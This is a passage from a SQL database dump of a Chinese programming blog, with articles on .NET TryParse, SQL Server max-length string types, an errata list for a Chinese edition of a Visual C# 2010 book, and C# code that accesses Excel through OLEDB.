/>\r\n基本数字类型包含Parse和TryParse方法，可用于将数字字符串转换为指定的数字类型，例如:</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731140718159381.jpg\" style=\"height:100px; width:302px\" /></p>\r\n\r\n<p>TryParse方法是.NET2.0中引入的，它能提供有条件的解析。这个方法会返回一个布尔值，以指示解析是否成功，从而可以免去添加异常处理代码的麻烦。下面的例子使用了一个Int32类型来演示TryParse的两种形式:</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731140750329971.jpg\" style=\"height:89px; width:453px\" /></p>\r\n\r\n<p>在第二种形式中，第一个参数是要解析的文本字符串，第二个参数是NumberStyles枚举类型，它说明了输入字符串中可能包含的内容，返回值将放在第四个参数中返回。</p>\r\n',0,1438322899,0,0),(135,44,'了解SQLServer中varchar(max)、nvarchar(max)和varbinary(max)','<p>在Microsoft SQLServer2005及以上的版本中，对于varchar(n)、nvarchar(n)和varbinary(n)有了max的扩展。可以使用如：varchar(max)、nvarchar(max)和varbinary(max)的大值数据类型来存储最多2^30-1个字节的数据。</p>\r\n\r\n<p>这几个数据类型在行为上和较小的数据类型 varchar、nvarchar 和 varbinary 相同。<br />\r\n微软的说法是用这个数据类型来代替之前的text、ntext 和 image 数据类型，它们之间的对应关系为：<br />\r\nvarchar(max)&mdash;&mdash;-text;<br />\r\nnvarchar(max)&mdash;&ndash;ntext;<br />\r\nvarbinary(max)&mdash;-image.<br />\r\n有了大值数据类型之后，在对大值数据操作的时候要比以前灵活的多了。比如：之前text是不能用&lsquo;like&rsquo;的，有了varchar(max)之后就没有这些问题了，因为varchar(max)在行为上和varchar(n)上相同，所以，可以用在varchar的都可以用在varchar(max)上。</p>\r\n\r\n<p>以varchar为例，varchar支持8000字符，Text支持2GB字符，但是，替换函数在编写出来的时候，就对TEXT数据类型不起作用。</p>\r\n\r\n<p>Update TableName Set DocuMent＝REPLACE(DocuMent,String1,String2) /*此行将报错*/</p>\r\n\r\n<p>同样也对CHARINDEX或者SUBSTRING不起作用&mdash;&mdash;或者至少是他们在超过8千个字符的情况下不起作用。更进一步地讲，如果开发人员忘了处理TEXT或者IMAGE类型的本地变量，则实际上不支持任何操作。即使是简单地更新一个文档中的一个子字符串都需要用到很多的东西，以及难以使用的类似READTEXT和WRITETEXT的函数。</p>\r\n\r\n<p>SQL Server 2005引入了一系列新的被称为max的数据类型(或者说是参数类型)。这是varchar、nvarchar 和 varbinary类型的扩展，这几种类型以前被限制在8000字节以下。max可以容纳高达2GB的数据，与TEXT和IMAGE一样&mdash;&mdash;并且完全兼容所有的SQL Server内置的字符串函数。</p>\r\n\r\n<p>用max关键字定义一个某种max类型的变量与替代字符串的尺寸(为varchar、nvarchar的时候)或者字节(为varbinary的时候)一样简单。</p>\r\n\r\n<p>DECLARE @BigString varchar(max)<br />\r\nSET @BigString = &#39;abc&#39;</p>\r\n\r\n<p>虽然这个变量可以自由地操纵，并且可以传递给任何的内置的字符串函数，兼容性仍然不是没有问题。首先，开发人员不能期望指定了尺寸的varchar和nvarchar变量在达到8000个字节的极限的时候可以自动&ldquo;升级&rdquo;到max版本。例如，如下的批处理:</p>\r\n\r\n<p>DECLARE @String1 varchar(4001)<br />\r\nDECLARE @String2 varchar(4001)<br />\r\nSET @String1 = REPLICATE(&#39;1&#39;, 4001)<br />\r\nSET @String2 = REPLICATE(&#39;2&#39;, 4001)<br />\r\nSELECT LEN(@String1 + @String2)</p>\r\n\r\n<p>4001+4001=8002，但是指定了尺寸的varchar的极限是8000。因为这两个变量中没有一个是max类型，LEN函数的结果就是8000，不是8002。在将两个变量连接的时候，一种简单的修正方法就是声明这两个变量中的一个为varchar(max)或者将其中的一个变量进行转换。与一个规定了尺寸的类型进行连接的时候，优先考虑max类型，最终结果是max类型。所以，以下批处理的结果是8002，正如我们期望的一样:</p>\r\n\r\n<p>DECLARE @String1 varchar(4001)<br />\r\nDECLARE @String2 varchar(4001)<br />\r\nSET @String1 = REPLICATE(&#39;1&#39;, 4001)<br />\r\nSET @String2 = REPLICATE(&#39;2&#39;, 4001)<br />\r\nSELECT LEN(CONVERT(varchar(max), @String1) + @String2)</p>\r\n\r\n<p>在传递给字符串函数的时候，开发人员意识到字符串的原意在默认情况下是规定了尺寸的，而不是max类型，也是至关重要的。例如，以下查询的结果就很令人惊奇:</p>\r\n\r\n<p>SELECT LEN(REPLICATE(&#39;1&#39;, 8002))</p>\r\n\r\n<p>因为字符串&lsquo;1&rsquo;是被作为规定了尺寸的varchar对待，而不是varchar(max)，结果就是8000&mdash;&mdash;但是在SQL Server 2005中，REPLICATE函数能够产生高达2GB的字符串。要修正这个问题，可以将字符串转换为varchar(max)，这样函数就会输出同样的类型了:</p>\r\n\r\n<p>SELECT LEN(REPLICATE(CONVERT(varchar(max), &#39;1&#39;), 8002))</p>\r\n\r\n<p>这个查询现在将会返回期望的结果:8002。记住，总是要对采用了新特性编写的代码进行非常仔细的测试;隐藏的问题，例如上面描述的问题，可能并且毫无疑问地会在最坏的时间里造成灾难性的后果。</p>\r\n\r\n<p>除了变量之外，max类型也可以用于定义表的字段:</p>\r\n\r\n<p>CREATE TABLE BigStrings (BigString varchar(max))</p>\r\n\r\n<p>当用于表的时候，意识到max类型具有与TEXT和IMAGE类型稍微不同的行溢出行为是非常重要的。在SQL Server中，最大的行尺寸是8060字节。要超过这个限制，并且仍然管理每个都拥有高达2GB的存储，用TEXT和IMAGE类型存储的数据会被存储引擎自动地断行，在行里只留下一个16字节的指针。这意味着行的尺寸是减少了，这对性能有好处。然而，检索大数据是昂贵的，因为它不是与同一行的数据存放在同一个位置。</p>\r\n\r\n<p>max数据类型在默认情况下，使用TEXT/IMAGE溢出行为和正常尺寸的varchar/varbinary类型的行为的混合方式。如果一个字段的数据，加上表中所有其他字段的数据，总量少于8060字节，数据就存放在行内。如果数据超过8060字节，max字段的数据就会存放在行外。对于大字符串的表，以下的行将会与表中的其他数据存储在同一个数据页内:</p>\r\n\r\n<p>INSERT BigStrings (BigString) VALUES (REPLICATE(&#39;1&#39;, 8000))<br />\r\nBut the following row will result in an overflow:<br />\r\nINSERT BigStrings (BigString) VALUES (REPLICATE(CONVERT(varchar(max), &#39;1&#39;), 100000))</p>\r\n\r\n<p>你可以更改max数据类型在每个表的基础上的默认的行为，它们会表现得和TEXT和IMAGE类型一样。这是通过使用sp_tableoption 存储过程中的&ldquo;大数值类型在行外&rdquo;选项实现的。为了修改大字符串表以将max类型的处理方式变得与TEXT和IMAGE数据类型的处理方式相同，可以使用如下的T-SQL:</p>\r\n\r\n<p>EXEC sp_tableoption<br />\r\n&#39;BigStrings&#39;,<br />\r\n&#39;large value types out of row&#39;,<br />\r\n&#39;1&#39;</p>\r\n\r\n<p>扩展：</p>\r\n\r\n<p>既然是以max有这么多灵活性，一些数据库设计师将会被引诱以下列的方式开始定义表:</p>\r\n\r\n<p>CREATE TABLE Addresses(<br />\r\nName varchar(max),<br />\r\nAddressLine1 varchar(max),<br />\r\nAddressLine2 varchar(max),<br />\r\nCity varchar(max),<br />\r\nState varchar(max),<br />\r\nPostalCode varchar(max)<br />\r\n)</p>\r\n\r\n<p>我建议你最好不要这样做，一个企业应用中的数据模型既应该包含有具有实际限制的字段，还要给程序设计师提供有关字段尺寸的指导文档。像这样的表又该创建什么样的文档呢？</p>\r\n\r\n<p>总知，max标记的数据类型为SQL Server 2005及之后版本处理大数据增加了很大部分的灵活性，但在使用中需要自己根据需求选择字段类型。</p>\r\n\r\n<p>转自：http://www.poorren.com/sqlserver-2005-varcharmax-nvarcharmax-varbinarymax/comment-page-1/</p>\r\n',0,1438323658,0,0),(136,38,'《Visual C# 2010 Step by Step》中文版资讯、勘误和试读(1-5章/25-29章)(转)','<p>原文地址&nbsp; http://transbot.blog.163.com/blog/static/54213961201052032432151/</p>\r\n\r\n<p>《Visual C# 2010 Step by Step》中文版资讯、勘误和试读(1-5章/25-29章)</p>\r\n\r\n<p>2010-06-20 15:24:32阅</p>\r\n\r\n<p><br />\r\n更新历史：</p>\r\n\r\n<p>2010.6.20 - 上传1-5章/ 25-29章电子档，添加了目录、前言、作者序、译者序等；修订了一些小bug</p>\r\n\r\n<p>2010.6.21 - 提交出版社，进入编辑环节</p>\r\n\r\n<p>2010.8.10 - 本书已上市</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>整个学习过程非常清晰和直接。在本书上一版《Visual C# 2008从入门到精通》的基础上，新的一版进行了大量修订和增补。在内容的衔接和对新的C# 4.0的侧重上，更是下足了功夫。如果你是一名C#的新手，可以选择从头读到尾的方式，整个阅读过程应该是流畅、没有阻碍的。如果你是一名有经验的C#开发者，那么可以选择性地阅读自己感兴趣的主题，比如自己感觉比较薄弱的环节以及和C# 4.0新特性有关的章节。具体可以参见本书前言的&ldquo;导读&rdquo;一节。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>新书仍然沿用了广受好评的&ldquo;Step by Step&rdquo;讲课方式，帮助读者从无到有，逐步掌握VC#编程。这个版本对2008版的不足和缺漏进行了全面修订。新的版本布局更合理，文字更清晰，是不可多得的一本Visual C#编程参考书。</p>\r\n\r\n<p><br />\r\n现在放出的1-5章和25-29章初稿，是意见修订版本，供读者抓虫和提出修改意见。均已插好图，并进行了简单排版。读者凭借这本书，可以轻松上路，并将一路保持编程的新鲜感，直至最后接触并掌握高级的C#主题。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>-------------------------勘误开始----------------------</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>1.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 位置：323页中间一段</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 原文：确定类型不会由于小心而被混用</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更正：确定类型不会由于不小心而被混用</p>\r\n\r\n<p>2.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 位置：236页倒数第1行</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 原文：Suare类</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更正：Square类</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说明：感谢yolylight</p>\r\n\r\n<p>3.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 位置：63页第一行代码末尾</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更正：最后的 noOfDays = 5 的5应该加粗</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说明：感谢英年早肥</p>\r\n\r\n<p>4.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 位置：110-111页</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 原文：试图除以0</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更正：尝试除以0</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说明：感谢lf-9</p>\r\n\r\n<p>5.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 位置：59页下方的代码</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 原文：optMethod(1, 2.5. &quot;World&quot;);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更正：optMethod(1, 2.5, &quot;World&quot;);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说明：感谢lf-9</p>\r\n\r\n<p>6.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 位置：169页第1段代码</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 原文：wed dingAnniversary</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更正：weddingAnniversary</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说明：感谢lf-9</p>\r\n\r\n<p>7.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 位置：185页最后一行</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 原文：因为将最后一个元素将出现两个副本。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更正：因为最后一个元素将出现两个副本。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说明：感谢lf-9</p>\r\n\r\n<p>8.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 位置：338页，第4步</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 原文：static void InsertIntoTree&lt;TItem&gt;(Tree&lt;Item&gt; tree,....)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更正：static void InsertIntoTree&lt;TItem&gt;(Tree&lt;TItem&gt; tree,....)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说明：感谢yolylight</p>\r\n\r\n<p>9.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 位置：57页倒数第1行</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 原文：第一个参数和第二个参数</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更正：第一个参数和第三个参数</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说明：感谢英年早肥</p>\r\n\r\n<p>10.&nbsp;&nbsp; 位置：55页的&ldquo;调试&rdquo;工具栏图片标注</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更正：&ldquo;逐语句&rdquo;、&ldquo;逐过程&rdquo;和&ldquo;跳出&rdquo;，整体左移1格</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说明：感谢chinamcafee</p>\r\n\r\n<p>11.&nbsp;&nbsp; 位置：144页，步骤5</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更正：删除&ldquo;撤消对前４个语句的注释。&rdquo;这句话</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说明：感谢英年早肥、gh</p>\r\n\r\n<p>12.&nbsp;&nbsp; 位置：译者序 第二段最后一行</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 原文：加发开发过程</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更正：加快开发过程</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说明：感谢老赵</p>\r\n\r\n<p>13.&nbsp;&nbsp; 位置：第86页倒数第一行</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更正：while 改成 for</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说明：感谢老赵</p>\r\n\r\n<p>14.&nbsp;&nbsp; 位置：第188页，10.2.3节，第1行</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 原文：list-in</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更正：last-in</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说明：感谢supegg</p>\r\n\r\n<p>15.&nbsp;&nbsp; 位置：229页第3行</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 原文：string NumberOfLegs();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更正：int NumberOfLegs();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说明：感谢老赵</p>\r\n\r\n<p>16.&nbsp;&nbsp; 位置：49页上部代码中的注释</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 原文：变星不在当前方法的作用域中</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更正：变量不在当前方法的作用域</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说明：感谢李耀、netbartj</p>\r\n\r\n<p>17.&nbsp;&nbsp; 位置：418页 22.2.1节 的第二段</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 原文：fist name</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更正：first name</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说明：感谢YESO</p>\r\n\r\n<p>18.&nbsp;&nbsp; 位置：83页的步骤5</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 原文：右击</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更正：单击</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说明：感谢YESO</p>\r\n\r\n<p>19.&nbsp;&nbsp; 位置：110页第步骤6，第二行</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 原文：/ Divide</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更正：/ Division</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说明：感谢gh</p>\r\n\r\n<p>20.&nbsp;&nbsp; 位置：122页补充内容</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 原文：WDF</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更正：WPF</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说明：感谢学者</p>\r\n\r\n<p>21.&nbsp;&nbsp; 位置：79页步骤13</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 原文：所有特殊字符(&lt;,&gt;,&amp;,&#39;和&#39;)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更正：所有特殊字符(&lt;,&gt;,&amp;,&quot;和&#39;)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说明：感谢gh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;</p>\r\n\r\n<p>22.&nbsp;&nbsp; 位置：633页步骤1</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 原文：&lt;%@ ServiceHost Language=&quot;C#&quot; Debug=&quot;true&quot; Service=&quot;ProductsService&quot; CodeBehind=&quot;~/App_Code/ProductsServices.cs&quot; %&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更正：&lt;%@ ServiceHost Language=&quot;C#&quot; Debug=&quot;true&quot; Service=&quot;ProductInformation&quot; CodeBehind=&quot;~/App_Code/ProductInformation.cs&quot; %&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说明：感谢liukeman1111@yeah</p>\r\n\r\n<p>23.&nbsp;&nbsp; 位置：251页底注2</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 原文：术诃</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更正：术语</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说明：感谢zepto.wow</p>\r\n\r\n<p>24.&nbsp;&nbsp; 位置：P208 中间部分 12.2 使用继承 章节中第八行</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 原文：DerivedClas</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更正：DerivedClass</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说明：感谢学者</p>\r\n\r\n<p>25.&nbsp;&nbsp; 位置：136页图，下半部分</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 原文：c = newCicle(42);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更正：c = new Cicle(42);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说明：感谢吹着口哨下楼</p>\r\n\r\n<p><br />\r\n&nbsp; -------------------------勘误结束----------------------</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>下载电子版书稿、原书配套练习文件和原书附赠的附录：</p>\r\n\r\n<p>1. 请访问我的网盘：http://transbot.ys168.com (只支持IE内核浏览器)</p>\r\n\r\n<p>2. 选择正确的目录：&ldquo;Visual C# 2010从入门到精通 Visual C# 2010 Step by Step&rdquo;</p>\r\n\r\n<p>3. 下载正确的文件：Steup.exe（原书配套练习文件的安装文件）</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Visual CSharp 2010从入门到精通.翻译初稿.易读版.1-5章.25-29章.pdf（电子版书稿）</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 附录.pdf（原书附赠的附录，英文版）</p>\r\n\r\n<p><br />\r\n关于《Visual C# 2008从入门到精通》：</p>\r\n\r\n<p>ISBN：978-7-302-23428-9</p>\r\n\r\n<p>原名：《Visual C# 2010 Step by Step》</p>\r\n\r\n<p>原著：John Sharp</p>\r\n\r\n<p>翻译：周靖</p>\r\n\r\n<p>配套源码下载：</p>\r\n\r\n<p>http://transbot.ys168.com/（暂时只支持IE浏览器，请在对应的目录中下载）</p>\r\n\r\n<p>中文版勘误：</p>\r\n\r\n<p>http://transbot.blog.163.com/blog/static/54213961201052032432151/</p>\r\n\r\n<p>更多的勘误建议请发送至：transbot@gmail.com； 或直接在这里留言。</p>\r\n',0,1438323789,0,0),(137,38,'C#用oledb操作excel','<p>using System;</p>\r\n\r\n<p>using System.Collections.Generic;</p>\r\n\r\n<p>using System.Linq;</p>\r\n\r\n<p>using System.Text;</p>\r\n\r\n<p>using System.Data;</p>\r\n\r\n<p>using System.Data.OleDb;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>namespace ConsoleApplication2</p>\r\n\r\n<p>{</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; class Program</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; static void Main(string[] args)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string ExcelConnString = &quot;Provider=Microsoft.Jet.OLEDB.4.0;Data Source=C:\\\\a.xls;Extended Properties=Excel 8.0&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OleDbConnection ExcelOldDbConn = new OleDbConnection();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ExcelOldDbConn.ConnectionString = ExcelConnString;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ExcelOldDbConn.Open();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string ExcelSelectStr = &quot;SELECT * FROM [Sheet1$]&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OleDbCommand ExcelSelectCmd = new OleDbCommand(ExcelSelectStr, ExcelOldDbConn);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OleDbDataReader ExcelDR = ExcelSelectCmd.ExecuteReader();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while(ExcelDR.Read())</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;{0} {1} {2} {3} {4} {5} {6} {7}&quot;, ExcelDR.GetString(0), ExcelDR.GetString(1), ExcelDR.GetString(2), ExcelDR.GetString(3), ExcelDR.GetString(4), ExcelDR.GetString(5), ExcelDR.GetString(6), ExcelDR.GetString(7));</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ExcelDR.Close();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ExcelSelectStr = &quot;insert into [Sheet1$](aaa,bbb) values(&#39;我们大家&#39;,&#39;你们大家&#39;)&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ExcelSelectCmd.CommandText = ExcelSelectStr;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ExcelSelectCmd.ExecuteNonQuery();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ExcelSelectStr = &quot;SELECT count(*) FROM 